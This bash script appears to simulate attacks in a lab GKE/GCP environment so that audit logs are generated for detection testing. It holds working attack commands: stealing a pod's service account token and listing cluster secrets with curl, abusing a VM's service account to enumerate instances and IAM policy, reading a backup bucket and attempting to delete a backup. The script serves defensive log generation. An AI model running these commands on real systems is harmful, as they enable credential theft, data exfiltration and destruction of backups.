#!/bin/bash

# --- Color Variables ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${BLUE}======================================================${NC}"
echo -e "${RED}   INITIATING NOISY ATTACK SIMULATION (LOG GENERATOR) ${NC}"
echo -e "${BLUE}======================================================${NC}"
echo ""

# -----------------------------------------------------------------
# SCENARIO 1: GKE Audit Log Generation (K8s API Abuse)
# -----------------------------------------------------------------
echo -e "${YELLOW}[*] PHASE 1: GKE API Abuse (Triggering K8s Audit Logs)...${NC}"
POD_NAME=$(kubectl get pods -l app=wiz-webapp -o jsonpath='{.items[0].metadata.name}' 2>/dev/null)

if [ -n "$POD_NAME" ]; then
    TOKEN=$(kubectl exec $POD_NAME -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)
    API_SERVER=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')
    
    echo -e "${YELLOW}[*] Executing unauthorized secret scraping across all namespaces...${NC}"
    # This generates a massive "list secrets" event in GKE Audit Logs
    curl -s -k -H "Authorization: Bearer $TOKEN" $API_SERVER/api/v1/secrets > /dev/null
    curl -s -k -H "Authorization: Bearer $TOKEN" $API_SERVER/api/v1/namespaces/kube-system/secrets > /dev/null
    
    echo -e "${GREEN}[+] K8s API Abuse logged.${NC}"
else
    echo -e "${RED}[!] GKE Pod not found. Skipping Phase 1.${NC}"
fi
echo ""

# -----------------------------------------------------------------
# SCENARIO 2: GCP Cloud Audit Log Generation (IAM Abuse)
# -----------------------------------------------------------------
echo -e "${YELLOW}[*] PHASE 2: Lateral Movement & IAM Abuse (Triggering GCP Admin Logs)...${NC}"
echo -e "${YELLOW}[*] Utilizing vulnerable MongoDB VM's compute.admin Service Account to map GCP environment...${NC}"

# We SSH into the VM and force it to use its attached SA to do things a DB should NEVER do
gcloud compute ssh wiz-mongodb-vm --zone=us-central1-a --command="
    echo '    -> Listing all compute instances in the project...'
    gcloud compute instances list --format='value(name)' > /dev/null 2>&1
    echo '    -> Attempting to read project IAM policies...'
    gcloud projects get-iam-policy \$(gcloud config get-value project) > /dev/null 2>&1
"
echo -e "${GREEN}[+] GCP IAM/Compute Abuse logged.${NC}"
echo ""

# -----------------------------------------------------------------
# SCENARIO 3: Cloud Storage Exfiltration & Tampering
# -----------------------------------------------------------------
echo -e "${YELLOW}[*] PHASE 3: Cloud Storage Exfiltration (Triggering Storage Logs)...${NC}"
BUCKET_NAME=$(gcloud storage ls 2>/dev/null | grep 'wiz-db-backups' | sed 's|gs://||g' | sed 's|/||g' | head -n 1)

if [ -n "$BUCKET_NAME" ]; then
    echo -e "${YELLOW}[*] Exfiltrating data from $BUCKET_NAME...${NC}"
    # 1. Read the bucket (Data Access Log if enabled)
    curl -s "https://storage.googleapis.com/$BUCKET_NAME/" > /dev/null
    
    echo -e "${YELLOW}[*] Attempting unauthorized deletion of backups to cover tracks...${NC}"
    # 2. Attempt a DELETE request (This fails with 403, generating a high-severity Permission Denied Admin Log)
    curl -s -X DELETE "https://storage.googleapis.com/$BUCKET_NAME/mongodump-latest" > /dev/null
    
    echo -e "${GREEN}[+] Storage Exfiltration & Tampering attempts logged.${NC}"
else
    echo -e "${RED}[!] Bucket not found. Skipping Phase 3.${NC}"
fi

echo ""
echo -e "${BLUE}======================================================${NC}"
echo -e "${RED}      SIMULATION COMPLETE - LOGS PUSHED TO GCP        ${NC}"
echo -e "${BLUE}======================================================${NC}"
